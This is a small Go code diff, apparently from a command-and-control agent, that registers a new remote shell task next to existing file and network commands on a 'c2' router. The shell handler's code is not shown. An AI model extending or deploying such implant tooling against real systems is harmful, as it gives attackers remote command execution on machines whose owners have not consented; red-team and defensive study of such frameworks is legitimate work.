@@ -27,6 +27,7 @@ const (
 	opChmod
 	opMkdir
 	opIfconfig
+	opShell
 )
 
 func SetTasks(r *c2.Router) {
@@ -48,4 +49,5 @@ func SetTasks(r *c2.Router) {
 	r.HandleFunc(opChmod, fs.CmdChmod)
 	r.HandleFunc(opMkdir, fs.CmdMkdir)
 	r.HandleFunc(opIfconfig, net.CmdIfconfig)
+	r.HandleFunc(opShell, system.CmdShell)
 }
